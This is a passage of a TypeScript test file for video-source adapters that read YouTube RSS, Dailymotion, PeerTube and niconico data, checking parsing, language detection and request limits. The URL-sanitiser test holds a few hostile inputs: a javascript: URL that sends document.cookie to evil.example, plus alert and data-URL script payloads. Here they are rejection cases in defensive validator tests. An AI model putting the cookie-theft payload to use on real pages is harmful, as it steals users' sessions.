/**
 * Tests for the keyless source adapters (youtube-rss, dailymotion, peertube, niconico) and their shared util.
 * All network access goes through a fake HttpClient that serves REAL responses recorded with curl on
 * 2026-09-28 (test/fixtures/keyless/, trimmed to a few items). An opt-in live smoke test runs with LIVE=1.
 */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { CollectContext, CollectLogger, HttpClient, RawVideo, Seeds, SourceAdapter } from '../src/types.ts';
import {
  youtubeRss,
  parseYoutubeFeed,
  likesFromStarRating,
  youtubeFeedUrl,
  youtubePlaylistFeedUrl,
  uploadsPlaylists,
  entryLanguage,
  CONSECUTIVE_FAILURE_LIMIT,
} from '../src/sources/youtube-rss.ts';
import {
  dailymotion,
  dailymotionIdsUrl,
  dailymotionGlobalLocalization,
  dailymotionWindows,
  DAILYMOTION_FIELDS,
} from '../src/sources/dailymotion.ts';
import {
  peertube,
  isNonPublicAddress,
  isPublicHostName,
  parsePeertubePlatformId,
  peertubePlatformId,
  peertubeToRawVideo,
  setPeertubeHostResolver,
} from '../src/sources/peertube.ts';
import { niconico, niconicoTags, niconicoToRawVideo, NICONICO_FIELDS } from '../src/sources/niconico.ts';
import {
  RequestBudget,
  USER_AGENT,
  chunk,
  cleanDescription,
  declaredLanguageConflicts,
  decodeEntities,
  detectLanguage,
  detectScriptLanguage,
  formatFromDuration,
  httpStatusOf,
  normalizeCountry,
  normalizeLanguage,
  parseTime,
  safeCount,
  safeHttpUrl,
  safeNumber,
  stripHtml,
  truncate,
} from '../src/sources/util.ts';

/* ================================================================== harness */

const FIXTURES = fileURLToPath(new URL('./fixtures/keyless/', import.meta.url));
const fx = (name: string): string => readFileSync(FIXTURES + name, 'utf8');
const fxJson = <T = any>(name: string): T => JSON.parse(fx(name)) as T;

const NOW = Date.parse('2026-09-28T12:00:00Z');

type Reply = unknown | Error;
interface Route {
  name: string;
  match: (u: URL) => boolean;
  reply: (u: URL, n: number) => Reply | Promise<Reply>;
}

/** Error shaped like a typical HttpClient failure (status + raw body). */
function httpError(status: number, body?: unknown): Error {
  const text = body === undefined ? '' : typeof body === 'string' ? body : JSON.stringify(body);
  return Object.assign(new Error(`HTTP ${status}`), { status, body: text });
}

class FakeHttp implements HttpClient {
  requestCount = 0;
  calls: { url: string; headers?: Record<string, string> }[] = [];
  private hits = new Map<string, number>();
  constructor(private readonly routes: Route[]) {}

  private async handle(url: string, headers?: Record<string, string>): Promise<unknown> {
    this.requestCount++;
    this.calls.push({ url, headers });
    const u = new URL(url);
    const route = this.routes.find((r) => r.match(u));
    if (!route) throw new Error(`FakeHttp: no fixture for ${url}`);
    const n = (this.hits.get(route.name) ?? 0) + 1;
    this.hits.set(route.name, n);
    const out = await route.reply(u, n);
    if (out instanceof Error) throw out;
    return out;
  }

  async getJson<T = unknown>(url: string, init?: { headers?: Record<string, string> }): Promise<T> {
    const out = await this.handle(url, init?.headers);
    return (typeof out === 'string' ? JSON.parse(out) : out) as T;
  }

  async getText(url: string, init?: { headers?: Record<string, string> }): Promise<string> {
    const out = await this.handle(url, init?.headers);
    return typeof out === 'string' ? out : JSON.stringify(out);
  }

  urls(): URL[] {
    return this.calls.map((c) => new URL(c.url));
  }
}

const silent: CollectLogger = { info() {}, warn() {}, error() {} };

function emptySeeds(): Seeds {
  return { youtubeChannels: [], keywords: [], dailymotion: [], niconico: [], peertube: [], creators: [] };
}

function makeCtx(http: HttpClient, over: Partial<Omit<CollectContext, 'seeds'>> & { seeds?: Partial<Seeds> } = {}): CollectContext {
  const { seeds, ...rest } = over;
  return {
    now: NOW,
    http,
    log: silent,
    env: {},
    refreshIds: [],
    maxRequests: 100,
    ...rest,
    seeds: { ...emptySeeds(), ...(seeds ?? {}) },
  };
}

const byId = (videos: RawVideo[], id: string): RawVideo => {
  const v = videos.find((x) => x.platformId === id);
  if (!v) throw new Error(`video ${id} not found in [${videos.map((x) => x.platformId).join(', ')}]`);
  return v;
};

const HANGUL = /[가-힯]/;

function expectAdapterContract(a: SourceAdapter, id: string, platform: string) {
  expect(a.id).toBe(id);
  expect(a.platform).toBe(platform);
  expect(a.requiresCredentials).toBe(false);
  expect(a.envKeys).toEqual([]);
  expect(a.isEnabled({})).toBe(true);
  expect(a.version).toBe(1);
  expect(a.docsUrl).toMatch(/^https:\/\//);
  expect(a.discovery).toMatch(HANGUL);
  expect(a.notes.length).toBeGreaterThanOrEqual(3);
  for (const n of a.notes) expect(n).toMatch(HANGUL);
  expect(a.label.length).toBeGreaterThan(0);
}

/* ================================================================== util */

describe('util', () => {
  it('detects ko/ja by script and refuses to guess otherwise', () => {
    expect(detectScriptLanguage('이게 왜 맛있지?')).toBe('ko');
    expect(detectScriptLanguage('琴葉茜と結月ゆかりとゆで卵')).toBe('ja');
    expect(detectScriptLanguage('ｶﾀｶﾅ')).toBe('ja'); // halfwidth katakana
    expect(detectScriptLanguage('BLACKPINK 10TH ANNIVERSARY')).toBeNull();
    expect(detectScriptLanguage('中文标题')).toBeNull(); // Han only: could be zh or ja
    expect(detectScriptLanguage('')).toBeNull();
    expect(detectScriptLanguage(null)).toBeNull();
    // Korean text using the katakana middle dot "・" is still Korean
    expect(detectScriptLanguage('뷰티・메이크업')).toBe('ko');
    // mixed: majority script wins
    expect(detectScriptLanguage('한국어 제목 with カ')).toBe('ko');
    expect(detectScriptLanguage('日本語のタイトルです 한')).toBe('ja');
  });

  it('detectLanguage uses the first text with a detectable script', () => {
    expect(detectLanguage('BLACKPINK', '#블랙핑크 #YG')).toBe('ko');
    expect(detectLanguage('ゲーム実況', '한국어 설명')).toBe('ja');
    expect(detectLanguage('English', null, undefined, 'only latin')).toBeNull();
  });

  it('truncates to ≤ 300 UTF-16 units without splitting surrogate pairs', () => {
    expect(truncate('short')).toBe('short');
    const long = 'a'.repeat(400);
    const t = truncate(long);
    expect(t.length).toBe(300);
    expect(t.endsWith('…')).toBe(true);
    const emoji = '😀'.repeat(200); // 400 UTF-16 units
    const te = truncate(emoji, 11);
    expect(te.length).toBeLessThanOrEqual(11);
    expect(te).toBe('😀'.repeat(5) + '…');
    expect(truncate('x'.repeat(300))).toBe('x'.repeat(300)); // exactly at the limit: untouched
  });

  it('strips HTML and decodes entities in one pass', () => {
    expect(stripHtml('a<br />b<br>c &amp; d&nbsp;e <b>bold</b>')).toBe('a\nb\nc & d e bold');
    expect(stripHtml('<p></p><br /><br />[앵커]<br>대선이')).toBe('[앵커]\n대선이');
    expect(decodeEntities('&amp;#39; &#39; &#xAC00; &quot;q&quot; &unknown;')).toBe(`&#39; ' 가 "q" &unknown;`);
    expect(cleanDescription('   ')).toBeNull();
    expect(cleanDescription(null)).toBeNull();
    expect(cleanDescription('x<br>y', { html: true })).toBe('x\ny');
    expect(cleanDescription('already decoded &#39;literal&#39;')).toBe('already decoded &#39;literal&#39;'); // no double decode
    expect(cleanDescription('a  \n\n\n\n  b')).toBe('a\n\nb');
  });

  it('parses numbers safely: null is never coerced to 0', () => {
    expect(safeCount(0)).toBe(0);
    expect(safeCount('1632525')).toBe(1632525);
    expect(safeCount('1,234')).toBe(1234);
    expect(safeCount(null)).toBeNull();
    expect(safeCount(undefined)).toBeNull();
    expect(safeCount('')).toBeNull();
    expect(safeCount('abc')).toBeNull();
    expect(safeCount(-3)).toBeNull();
    expect(safeCount(true)).toBeNull();
    expect(safeCount(Number.NaN)).toBeNull();
    expect(safeNumber('5.00')).toBe(5);
    expect(safeNumber('1e3')).toBe(1000);
    expect(safeNumber(Infinity)).toBeNull();
  });

  it('parses times and normalizes codes', () => {
    expect(parseTime('2026-09-28T07:08:32+09:00')).toBe(Date.parse('2026-09-27T22:08:32Z'));
    expect(parseTime(1746666705, 's')).toBe(1746666705000);
    expect(parseTime('1746666705', 's')).toBe(1746666705000);
    expect(parseTime('garbage')).toBeNull();
    expect(parseTime(null)).toBeNull();
    expect(normalizeLanguage('ko')).toBe('ko');
    expect(normalizeLanguage('pt-BR')).toBe('pt');
    expect(normalizeLanguage('zxx')).toBeNull();
    expect(normalizeLanguage('')).toBeNull();
    expect(normalizeCountry('kr')).toBe('KR');
    expect(normalizeCountry('KOR')).toBeNull();
    expect(normalizeCountry(null)).toBeNull();
  });

  it('derives format from duration with live precedence', () => {
    expect(formatFromDuration(20)).toBe('short');
    expect(formatFromDuration(60)).toBe('short');
    expect(formatFromDuration(61)).toBe('long');
    expect(formatFromDuration(0)).toBe('unknown');
    expect(formatFromDuration(null)).toBe('unknown');
    expect(formatFromDuration(0, true)).toBe('live');
    expect(formatFromDuration(3600, true)).toBe('live');
  });

  it('extracts HTTP status from different client error shapes', () => {
    expect(httpStatusOf(httpError(404))).toBe(404);
    expect(httpStatusOf(Object.assign(new Error('x'), { statusCode: 503 }))).toBe(503);
    expect(httpStatusOf({ response: { status: 429 } })).toBe(429);
    expect(httpStatusOf(new Error('GET https://x failed: HTTP 500 Internal Server Error'))).toBe(500);
    expect(httpStatusOf(new Error('Request failed with status code 403'))).toBe(403);
    expect(httpStatusOf(new Error('404 Not Found'))).toBe(404);
    expect(httpStatusOf(new Error('ECONNRESET'))).toBeNull();
  });

  it('safeHttpUrl keeps only absolute http(s) URLs', () => {
    expect(safeHttpUrl('https://example.org/a?b=1')).toBe('https://example.org/a?b=1');
    expect(safeHttpUrl('http://example.org')).toBe('http://example.org');
    expect(safeHttpUrl('javascript:alert(1)')).toBeNull();
    expect(safeHttpUrl('JavaScript:fetch("//evil.example/?c="+document.cookie)//')).toBeNull();
    expect(safeHttpUrl('data:text/html,<script>1</script>')).toBeNull();
    expect(safeHttpUrl('/relative/path')).toBeNull();
    expect(safeHttpUrl('https://user:pw@example.org/x')).toBe('https://example.org/x');
    expect(safeHttpUrl(null)).toBeNull();
    expect(safeHttpUrl(42)).toBeNull();
  });

  it('declaredLanguageConflicts flags ko/ja declarations on text written in another script', () => {
    expect(declaredLanguageConflicts('ko', 'Népal : les images par satellite des coulées de boue')).toBe(true);
    expect(declaredLanguageConflicts('ko', 'Jacopo Amigoni', 'alcune pitture a carattere mitologico')).toBe(true);
    expect(declaredLanguageConflicts('ko', '명일방주 PA-6')).toBe(false);
    expect(declaredLanguageConflicts('ko', 'BTS 🎉 2026')).toBe(false); // too few Latin letters to judge
    expect(declaredLanguageConflicts('ko', '豆乳丸子蛋挞', '烤好的蛋挞淋上豆乳酱')).toBe(true); // Chinese declared as ko
    expect(declaredLanguageConflicts('ko', 'Прайд в Южной Корее')).toBe(true);
    expect(declaredLanguageConflicts('ko', 'IMG_5715')).toBe(false);
    expect(declaredLanguageConflicts('ko', 'Jung Kook decodes the olfactory notes', '샤넬 향수')).toBe(false); // Korean tags count
    expect(declaredLanguageConflicts('ja', '東京 night walk in the rain')).toBe(false); // Han present
    expect(declaredLanguageConflicts('ja', 'Starkregen, warmes Essen')).toBe(true);
    expect(declaredLanguageConflicts('en', 'anything at all here')).toBe(false);
    expect(declaredLanguageConflicts(null, 'anything at all here')).toBe(false);
  });

  it('chunks arrays', () => {
    expect(chunk([1, 2, 3, 4, 5], 2)).toEqual([[1, 2], [3, 4], [5]]);
    expect(chunk([], 100)).toEqual([]);
  });

  it('RequestBudget counts own calls and client-side growth (retries), whichever is larger', () => {
    const http = { requestCount: 7 } as unknown as HttpClient;
    const b = new RequestBudget(http, 3);
    expect(b.remaining).toBe(3);
    b.take();
    expect(b.used).toBe(1);
    (http as { requestCount: number }).requestCount = 10; // client retried twice
    expect(b.used).toBe(3);
    expect(b.has()).toBe(false);
    expect(new RequestBudget(http, 0).has()).toBe(false);
    expect(new RequestBudget(http, Number.NaN).has()).toBe(false);
  });
});

/* ================================================================== youtube-rss */

const BLACKPINK = {
  channelId: 'UCOmHUn--16B90oW2L6FRR3A',
  handle: '@BLACKPINK',
  name: 'BLACKPINK',
  category: 'music/kpop',
  country: 'KR',
  language: 'ko',
};
const PAIK = {
  channelId: 'UCyn-K7rZLXjGl7VXGweIlcA',
  handle: '@paikscuisine',
  name: '백종원 PAIK JONG WON',
  category: 'food',
  country: 'KR',
  language: 'ko',
};
const MISSING = {
  channelId: 'UCxxxxxxxxxxxxxxxxxxxxxx',
  handle: null,
  name: 'Deleted channel',
  category: 'news',
  country: 'KR',
  language: 'ko',
};

function ytRoutes(overrides: Record<string, (n: number) => Reply> = {}): Route[] {
  const table: Record<string, (n: number) => Reply> = {
    [BLACKPINK.channelId]: () => fx('youtube-rss-blackpink.xml'),
    [PAIK.channelId]: () => fx('youtube-rss-paik.xml'),
    [MISSING.channelId]: () => httpError(404, fx('youtube-rss-404.html')),
    ...overrides,
  };
  return [
    {
      name: 'yt-feed',
      match: (u) => u.host === 'www.youtube.com' && u.pathname === '/feeds/videos.xml',
      reply: (u) => {
        const id = u.searchParams.get('channel_id') ?? '';
        const f = table[id];
        return f ? f(1) : httpError(404, fx('youtube-rss-404.html'));
      },
    },
  ];
}

describe('youtube-rss', () => {
  it('declares an accurate contract', () => {
    expectAdapterContract(youtubeRss, 'youtube-rss', 'youtube');
    expect(youtubeRss.metrics).toEqual(['views', 'likes']);
    const notes = youtubeRss.notes.join('\n');
    expect(notes).toContain('15');
    expect(notes).toContain('2025년 3월');
    expect(notes).toMatch(/댓글/);
  });

  it('parses a real feed (namespaces yt:, media:) into RawVideo', async () => {
    const http = new FakeHttp(ytRoutes());
    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [BLACKPINK] } }));
    expect(res.errors).toEqual([]);
    expect(http.calls.map((c) => c.url)).toEqual([youtubeFeedUrl(BLACKPINK.channelId)]);
    expect(res.videos.map((v) => v.platformId)).toEqual(['uw4OYow_v7Y', 'k--lCrP69hg', 'yQhbf7BW_wI']);

    const short = byId(res.videos, 'uw4OYow_v7Y');
    expect(short).toMatchObject({
      platform: 'youtube',
      url: 'https://www.youtube.com/shorts/uw4OYow_v7Y',
      title: 'BLACKPINK 10th Anniversary MEET & GREET 🖤💗', // &amp; decoded
      description: '#BLACKPINK #블랙핑크 #10THANNIVERSARY #WITHBLINK #YG #shorts',
      thumbnail: 'https://i2.ytimg.com/vi/uw4OYow_v7Y/hqdefault.jpg',
      publishedAt: Date.parse('2026-08-17T09:00:25+00:00'),
      durationSec: null,
      format: 'short',
      language: 'ko', // title is Latin; Hangul hashtag in the description decides
      languageSource: 'detected',
      country: 'KR',
      sourceCategory: 'youtube:seed:music/kpop',
      tags: [],
      counters: { views: 1632525, likes: 199346, comments: null, shares: null },
      observedAt: NOW,
      status: 'active',
      discoveredVia: 'seed-channel:UCOmHUn--16B90oW2L6FRR3A',
    });
    expect(short.account).toEqual({
      platform: 'youtube',
      platformId: 'UCOmHUn--16B90oW2L6FRR3A', // NOT the feed-level id, which lacks the "UC" prefix
      handle: '@BLACKPINK',
      name: 'BLACKPINK',
      url: 'https://www.youtube.com/channel/UCOmHUn--16B90oW2L6FRR3A',
      avatar: null,
      country: 'KR',
      followers: null,
      seedCategory: 'music/kpop',
    });

    const long = byId(res.videos, 'k--lCrP69hg');
    expect(long.format).toBe('long');
    expect(long.url).toBe('https://www.youtube.com/watch?v=k--lCrP69hg');
    expect(long.counters).toEqual({ views: 4374386, likes: 633833, comments: null, shares: null });

    const korean = res.videos[2];
    expect(korean.title).toContain('뛰어(JUMP)');
    expect(korean.language).toBe('ko');
    expect(korean.counters.views).toBe(944416);
    expect(res.accounts).toEqual([]);
  });

  it('treats a hidden like count (starRating count=0) as null, not 0, and truncates descriptions', async () => {
    const http = new FakeHttp(ytRoutes());
    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [PAIK] } }));
    expect(res.errors).toEqual([]);
    expect(res.videos).toHaveLength(2);
    const [long, short] = res.videos;
    expect(long.platformId).toBe('Da-yWFw5T3U');
    expect(long.title).toBe('이게 왜 맛있지?');
    expect(long.counters).toEqual({ views: 359270, likes: null, comments: null, shares: null });
    expect(long.description!.length).toBeLessThanOrEqual(300);
    expect(long.description!.endsWith('…')).toBe(true);
    expect(long.description!.startsWith('버터밥! 맛있죠~')).toBe(true);
    expect(long.account.name).toBe('백종원 PAIK JONG WON');
    expect(short.format).toBe('short');
    expect(short.counters.views).toBe(60818);
    expect(short.counters.likes).toBeNull();
    expect(likesFromStarRating('0')).toBeNull();
    expect(likesFromStarRating('12')).toBe(12);
    expect(likesFromStarRating(null)).toBeNull();
  });

  it('falls back to the seed language when no Hangul/Kana is present', async () => {
    const latinOnly = fx('youtube-rss-blackpink.xml').replace(/[가-힯]+/g, '');
    const http = new FakeHttp(ytRoutes({ [BLACKPINK.channelId]: () => latinOnly }));
    const seed = { ...BLACKPINK, language: 'en' };
    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [seed] } }));
    // the seed language is a hint, not a detection: kept, but without a provenance label
    expect(res.videos.map((v) => [v.language, v.languageSource])).toEqual([
      ['en', null],
      ['en', null],
      ['en', null],
    ]);
    // a ko seed on Latin-only text (e.g. Arirang News in English) is not applied
    const koSeed = await youtubeRss.collect(
      makeCtx(new FakeHttp(ytRoutes({ [BLACKPINK.channelId]: () => latinOnly })), { seeds: { youtubeChannels: [BLACKPINK] } }),
    );
    expect(koSeed.videos.map((v) => [v.language, v.languageSource])).toEqual([
      [null, null],
      [null, null],
      [null, null],
    ]);
    expect(entryLanguage('Iran says no talks planned as Trump expects more negotiations', null, 'ko')).toEqual({ language: null, languageSource: null });
    expect(entryLanguage('뉴스 속보', null, 'en')).toEqual({ language: 'ko', languageSource: 'detected' });
    const noLang = await youtubeRss.collect(
      makeCtx(new FakeHttp(ytRoutes({ [BLACKPINK.channelId]: () => latinOnly })), {
        seeds: { youtubeChannels: [{ ...BLACKPINK, language: null }] },
      }),
    );
    expect(noLang.videos[0].language).toBeNull();
    expect(noLang.videos[0].languageSource).toBeNull();
  });

  it('records a 404 channel as an error and continues with the next channel', async () => {
    const http = new FakeHttp(ytRoutes());
    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [MISSING, PAIK] } }));
    expect(http.calls).toHaveLength(2);
    expect(res.errors).toHaveLength(1);
    expect(res.errors[0]).toContain(MISSING.channelId);
    expect(res.errors[0]).toContain('404');
    expect(res.videos).toHaveLength(2);
  });

  it('survives a 500, a network error and an HTML page served with 200', async () => {
    const http = new FakeHttp(
      ytRoutes({
        UC500: () => httpError(500, 'oops'),
        UCnet: () => new Error('ECONNRESET'),
        UChtml: () => '<!DOCTYPE html><html><body>Before you continue to YouTube</body></html>',
      }),
    );
    const seeds = ['UC500', 'UCnet', 'UChtml'].map((channelId) => ({ ...MISSING, channelId }));
    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [...seeds, BLACKPINK] } }));
    expect(res.errors).toHaveLength(3);
    expect(res.errors[0]).toContain('HTTP 500');
    expect(res.errors[1]).toContain('ECONNRESET');
    expect(res.errors[2]).toContain('Atom');
    expect(res.videos).toHaveLength(3);
  });

  it('never exceeds maxRequests and reports the skipped channels', async () => {
    const http = new FakeHttp(ytRoutes());
    const res = await youtubeRss.collect(
      makeCtx(http, { maxRequests: 1, seeds: { youtubeChannels: [BLACKPINK, PAIK, MISSING] } }),
    );
    expect(http.requestCount).toBe(1);
    expect(res.videos).toHaveLength(3);
    expect(res.errors).toHaveLength(1);
    expect(res.errors[0]).toContain('maxRequests=1');
    expect(res.errors[0]).toContain('2개');

    const none = new FakeHttp(ytRoutes());
    const r0 = await youtubeRss.collect(makeCtx(none, { maxRequests: 0, seeds: { youtubeChannels: [BLACKPINK] } }));
    expect(none.requestCount).toBe(0);
    expect(r0.errors[0]).toContain('maxRequests=0');
  });

  it('de-duplicates seeds, ignores refreshIds and keeps channels without uploads as accounts', async () => {
    const emptyFeed =
      '<?xml version="1.0" encoding="UTF-8"?><feed xmlns:yt="http://www.youtube.com/xml/schemas/2015" xmlns="http://www.w3.org/2005/Atom"><title>Empty</title><author><name>Empty Channel</name></author></feed>';
    const http = new FakeHttp(ytRoutes({ UCempty: () => emptyFeed }));
    const res = await youtubeRss.collect(
      makeCtx(http, {
        refreshIds: ['someOldVideo'],
        seeds: { youtubeChannels: [PAIK, PAIK, { ...MISSING, channelId: 'UCempty' }] },
      }),
    );
    expect(http.requestCount).toBe(2);
    expect(res.videos).toHaveLength(2);
    expect(res.accounts).toHaveLength(1);
    expect(res.accounts[0]).toMatchObject({ platformId: 'UCempty', name: 'Empty Channel', seedCategory: 'news' });
    expect(res.gone ?? []).toEqual([]);
  });

  it('reads the long-form and Shorts playlists of fast channels and merges them by video id', async () => {
    const DAY = 86_400_000;
    const entry = (id: string, hoursAgo: number, link: 'watch' | 'shorts' = 'watch', channel = PAIK.channelId) =>
      `<entry><id>yt:video:${id}</id><yt:videoId>${id}</yt:videoId><yt:channelId>${channel}</yt:channelId><title>영상 ${id}</title>` +
      `<link rel="alternate" href="https://www.youtube.com/${link === 'shorts' ? `shorts/${id}` : `watch?v=${id}`}"/>` +
      `<published>${new Date(NOW - hoursAgo * 3_600_000).toISOString()}</published>` +
      `<media:group><media:community><media:starRating count="3" average="5.00" min="1" max="5"/><media:statistics views="${100 + hoursAgo}"/></media:community></media:group></entry>`;
    const feed = (entries: string[]) =>
      `<?xml version="1.0" encoding="UTF-8"?><feed xmlns:yt="http://www.youtube.com/xml/schemas/2015" xmlns:media="http://search.yahoo.com/mrss/" xmlns="http://www.w3.org/2005/Atom"><title>Fast</title><author><name>Fast Channel</name></author>${entries.join('')}</feed>`;
    // 15 uploads within 15 hours: a fast channel
    const channelFeed = feed(Array.from({ length: 15 }, (_, i) => entry(`c${i}`, i, i % 2 ? 'watch' : 'shorts')));
    const lists = uploadsPlaylists(PAIK.channelId)!;
    expect(lists).toEqual({ long: `UULF${PAIK.channelId.slice(2)}`, shorts: `UUSH${PAIK.channelId.slice(2)}` });
    const longFeed = feed([entry('c1', 1), entry('old-long', 40), entry('foreign', 2, 'watch', 'UCxxxxxxxxxxxxxxxxxxxxxx')]);
    const shortsFeed = feed([entry('c1', 1), entry('old-short', 90)]);
    const http = new FakeHttp([
      {
        name: 'feeds',
        match: (u) => u.pathname === '/feeds/videos.xml',
        reply: (u) => {
          if (u.searchParams.get('channel_id') === PAIK.channelId) return channelFeed;
          if (u.searchParams.get('channel_id') === BLACKPINK.channelId) return fx('youtube-rss-blackpink.xml');
          if (u.searchParams.get('playlist_id') === lists.long) return longFeed;
          if (u.searchParams.get('playlist_id') === lists.shorts) return shortsFeed;
          return httpError(404, '');
        },
      },
    ]);
    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [PAIK, BLACKPINK] } }));
    expect(res.errors).toEqual([]);
    // both channel feeds first, then the playlists of the one fast channel (BLACKPINK's 3-entry feed is not full)
    expect(http.calls.map((c) => c.url)).toEqual([
      youtubeFeedUrl(PAIK.channelId),
      youtubeFeedUrl(BLACKPINK.channelId),
      youtubePlaylistFeedUrl(lists.long),
      youtubePlaylistFeedUrl(lists.shorts),
    ]);
    expect(res.videos).toHaveLength(15 + 3 + 2); // + old-long, old-short; 'foreign' (another channel) ignored
    expect(byId(res.videos, 'old-long')).toMatchObject({ format: 'long', discoveredVia: `seed-channel:${PAIK.channelId}`, counters: { views: 140 } });
    expect(byId(res.videos, 'old-short').format).toBe('short');
    // playlist membership overrides the /shorts/ link heuristic
    expect(byId(res.videos, 'c1').format).toBe('short');
    expect(byId(res.videos, 'c2').format).toBe('short'); // link heuristic (not in the playlists read)
    expect(res.videos.some((v) => v.platformId === 'foreign')).toBe(false);
    expect(DAY).toBeGreaterThan(0);
  });

  it('stops after consecutive network errors / 429 / 5xx and returns what it has', async () => {
    const seeds = Array.from({ length: CONSECUTIVE_FAILURE_LIMIT + 5 }, (_, i) => ({ ...MISSING, channelId: `UCthrottled${i}` }));
    const http = new FakeHttp(ytRoutes(Object.fromEntries(seeds.map((sd) => [sd.channelId, () => httpError(429, 'Too Many Requests')]))));
    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [PAIK, ...seeds, BLACKPINK] } }));
    expect(http.requestCount).toBe(1 + CONSECUTIVE_FAILURE_LIMIT);
    expect(res.videos).toHaveLength(2); // PAIK only
    expect(res.errors[res.errors.length - 1]).toMatch(/연속 10회/);
    expect(res.errors[res.errors.length - 1]).toContain('6개 미수집');
  });

  it('parseYoutubeFeed returns null for non-feeds and tolerates missing fields', () => {
    expect(parseYoutubeFeed('not xml at all <<<')).toBeNull();
    expect(parseYoutubeFeed(fx('youtube-rss-404.html'))).toBeNull();
    const minimal = parseYoutubeFeed(
      '<feed xmlns="http://www.w3.org/2005/Atom"><entry><id>yt:video:abc</id><title>2026</title><published>2026-01-01T00:00:00+00:00</published></entry></feed>',
    )!;
    expect(minimal.entries).toHaveLength(1);
    expect(minimal.entries[0]).toMatchObject({ videoId: 'abc', title: '2026', views: null, likesCount: null, url: null });
    const entities = parseYoutubeFeed(
      '<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/"><entry><id>yt:video:e1</id>' +
        '<title>Tom &amp; Jerry&#39;s &#xAC00; &quot;q&quot; &amp;#39;</title>' +
        '<link rel="alternate" href="https://www.youtube.com/watch?v=e1&amp;t=1"/>' +
        '<media:group><media:description>a &lt;b&gt;</media:description></media:group></entry></feed>',
    )!;
    expect(entities.entries[0].title).toBe(`Tom & Jerry's 가 "q" &#39;`);
    expect(entities.entries[0].url).toBe('https://www.youtube.com/watch?v=e1&t=1');
    expect(entities.entries[0].description).toBe('a <b>');
  });
});

/* ================================================================== dailymotion */

const DM_KR = { channel: null, country: 'kr', language: null, sort: 'visited-week' as const, search: null, limit: 4 };
const DM_SEARCH = { channel: null, country: null, language: 'ko', sort: 'relevance' as const, search: '먹방', limit: 3 };

function dmItem(id: string, over: Record<string, unknown> = {}) {
  const base = fxJson('dailymotion-kr-visited-week.json').list[1];
  return { ...base, id, url: `https://www.dailymotion.com/video/${id}`, ...over };
}

function dmRoutes(extra: Route[] = []): Route[] {
  return [
    ...extra,
    {
      name: 'dm-ids',
      match: (u) => u.host === 'api.dailymotion.com' && u.pathname === '/videos' && u.searchParams.has('ids'),
      reply: () => fxJson('dailymotion-ids.json'),
    },
    {
      name: 'dm-search',
      match: (u) => u.host === 'api.dailymotion.com' && u.pathname === '/videos' && u.searchParams.has('search'),
      reply: () => fxJson('dailymotion-search-ko.json'),
    },
    {
      name: 'dm-list',
      match: (u) => u.host === 'api.dailymotion.com' && u.pathname === '/videos',
      reply: () => fxJson('dailymotion-kr-visited-week.json'),
    },
    {
      name: 'dm-video',
      match: (u) => u.host === 'api.dailymotion.com' && u.pathname.startsWith('/video/'),
      reply: (u) => {
        const id = u.pathname.split('/').pop();
        if (id === 'xbdshau') return httpError(404, fx('dailymotion-video-404.json'));
        if (id === 'xprivate') return httpError(403, { error: { code: 403, message: 'Access forbidden', type: 'access_forbidden' } });
        if (id === 'xflaky') return httpError(500, 'Internal Server Error');
        return httpError(404, fx('dailymotion-video-404.json'));
      },
    },
  ];
}

describe('dailymotion', () => {
  it('declares an accurate contract', () => {
    expectAdapterContract(dailymotion, 'dailymotion', 'dailymotion');
    expect(dailymotion.metrics).toEqual(['views', 'likes']);
  });

  it('builds the discovery URL with all fields and seed filters', async () => {
    const http = new FakeHttp(dmRoutes());
    await dailymotion.collect(makeCtx(http, { seeds: { dailymotion: [{ ...DM_KR, channel: 'news', language: 'ko' }] } }));
    const u = http.urls()[0];
    expect(`${u.origin}${u.pathname}`).toBe('https://api.dailymotion.com/videos');
    expect(u.searchParams.get('fields')!.split(',')).toEqual([...DAILYMOTION_FIELDS]);
    expect(u.searchParams.get('channel')).toBe('news');
    expect(u.searchParams.get('country')).toBe('kr');
    expect(u.searchParams.get('language')).toBe('ko');
    expect(u.searchParams.get('sort')).toBe('visited-week');
    expect(u.searchParams.get('limit')).toBe('4');
    expect(u.searchParams.get('page')).toBe('1');
    expect(u.searchParams.has('search')).toBe(false);
  });

  it('maps real API items: counters, source windows, format, provenance', async () => {
    const http = new FakeHttp(dmRoutes());
    const res = await dailymotion.collect(makeCtx(http, { seeds: { dailymotion: [DM_KR] } }));
    expect(res.errors).toEqual([]);
    expect(res.videos.map((v) => v.platformId)).toEqual(['x9j55p2', 'x8944hv', 'x8q2xx1', 'x9jdbui']);

    const ad = byId(res.videos, 'x8944hv');
    expect(ad).toMatchObject({
      platform: 'dailymotion',
      url: 'https://www.dailymotion.com/video/x8944hv',
      title: '★금산인삼면역력 영상_금홍제품_20s',
      description: null, // "" from the API
      thumbnail: 'https://s1.dmcdn.net/v/TlhZ31g41bfaWQ4F8/x360',
      publishedAt: 1647480647 * 1000,
      durationSec: 20,
      format: 'short',
      language: 'ko',
      languageSource: 'source',
      country: 'KR',
      sourceCategory: 'dailymotion:news',
      tags: [],
      observedAt: NOW,
      status: 'active',
      discoveredVia: 'dailymotion:visited-week:kr',
    });
    // likes_total 0 IS provided by the source -> stays 0; comments/shares are not provided -> null
    expect(ad.counters).toEqual({ views: 28708418, likes: 0, comments: null, shares: null });
    expect(ad.sourceWindows).toEqual([
      { metric: 'views', windowHours: 24, value: 16029 },
      { metric: 'views', windowHours: 168, value: 73711 },
      { metric: 'views', windowHours: 720, value: 408248 },
    ]);
    expect(ad.account).toEqual({
      platform: 'dailymotion',
      platformId: 'x2k4go2',
      handle: 'ggilbo',
      name: '금강일보',
      url: 'https://www.dailymotion.com/ggilbo',
      avatar: 'https://s2.dmcdn.net/u/9EGbY1gQrG8H9mCEg/80x80',
      country: 'KR',
      followers: 1,
    });

    const news = byId(res.videos, 'x9j55p2');
    expect(news.format).toBe('long'); // 63 s
    expect(news.tags).toContain('김수현');
    expect(news.description).not.toMatch(/<br/);
    expect(news.description!.length).toBeLessThanOrEqual(300);
